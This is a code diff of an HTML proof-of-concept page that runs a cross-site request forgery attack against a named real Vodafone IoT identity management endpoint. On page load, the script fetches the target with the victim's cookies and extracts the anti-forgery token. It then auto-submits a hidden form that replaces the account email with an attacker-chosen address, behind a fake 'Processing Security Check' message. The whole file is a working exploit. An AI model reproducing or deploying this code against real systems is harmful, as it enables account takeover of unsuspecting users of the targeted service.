@@ -1,78 +1,70 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>PoC 400 Bypass</title>
-</head>
+<head><title>CSRF PoC</title></head>
 <body>
-    <div id="msg" style="font-family: sans-serif; padding: 20px;">
-        <p id="status">Targeting: Vodafone IoT Identity...</p>
+    <div id="msg" style="padding:20px; font-family:sans-serif;">
+        <h2>Processing Security Check...</h2>
+        <p id="status">Syncing Cookies & Tokens...</p>
     </div>
 
     <script>
         const target = "https://identity.facilitymanagement.iot.vodafone.gr/identity/Manage";
 
-        async function launchExploit() {
+        async function startAttack() {
             try {
-                // 1. أهم خطوة: عمل GET عشان المتصفح يسحب كوكيز الـ Antiforgery ويخزنها
-                document.getElementById('status').innerText = "Step 1: Synchronizing Anti-Forgery Cookies...";
-                const response = await fetch(target, { 
-                    method: 'GET', 
-                    credentials: 'include' 
-                });
-                
+                // 1. سحب التوكن (GET) مع التأكد من إرسال واستقبال الكوكيز
+                const response = await fetch(target, { method: 'GET', credentials: 'include' });
                 const html = await response.text();
                 const parser = new DOMParser();
                 const doc = parser.parseFromString(html, 'text/html');
                 const token = doc.querySelector('input[name="__RequestVerificationToken"]')?.value;
 
                 if (!token) {
-                    document.getElementById('status').innerText = "❌ Error: Token not captured!";
+                    document.getElementById('status').innerText = "❌ Token not found. (Check Login Status)";
                     return;
                 }
 
-                // 2. الضربة القاضية باستخدام الفورم (لأنه ببعث كل الكوكيز تلقائياً)
-                document.getElementById('status').innerText = "Step 2: Token & Cookies Ready! Launching CSRF...";
+                document.getElementById('status').innerText = "✅ Token captured. Launching Final Attack...";
 
+                // 2. بناء فورم مطابق تماماً للـ Burp Request
                 const form = document.createElement('form');
-                form.method = "POST";
+                form.method = 'POST';
                 form.action = target;
 
-                // البيانات بالظبط زي ما السيرفر بدقق عليها
-                const payload = {
-                    "IsEmailConfirmed": "True",
-                    "Email": `hacked_${Math.random().toString(36).substring(7)}@vodafone-poc.io`,
-                    "PhoneNumber": "",
-                    "Name": "Xia0Checkmate",
-                    "Website": "",
-                    "Profile": "",
-                    "StreetAddress": "",
-                    "Locality": "12",
-                    "Region": "",
-                    "PostalCode": "",
-                    "Country": "",
-                    "__RequestVerificationToken": token
+                const data = {
+                    'IsEmailConfirmed': 'True',
+                    'Email': `hacked_${Math.random().toString(36).substring(7)}@vodafone-poc.io`,
+                    'PhoneNumber': '',
+                    'Name': 'Xia0Checkmate',
+                    'Website': '',
+                    'Profile': '',
+                    'StreetAddress': '',
+                    'Locality': '12',
+                    'Region': '',
+                    'PostalCode': '',
+                    'Country': '',
+                    '__RequestVerificationToken': token
                 };
 
-                for (const key in payload) {
+                for (const key in data) {
                     const input = document.createElement('input');
                     input.type = 'hidden';
                     input.name = key;
-                    input.value = payload[key];
+                    input.value = data[key];
                     form.appendChild(input);
                 }
 
                 document.body.appendChild(form);
                 
-                setTimeout(() => {
-                    form.submit();
-                }, 1000);
+                // الضربة القاضية
+                setTimeout(() => { form.submit(); }, 1000);
 
             } catch (err) {
                 document.getElementById('status').innerText = "❌ Error: " + err.message;
             }
         }
 
-        window.onload = launchExploit;
+        window.onload = startAttack;
     </script>
 </body>
 </html>
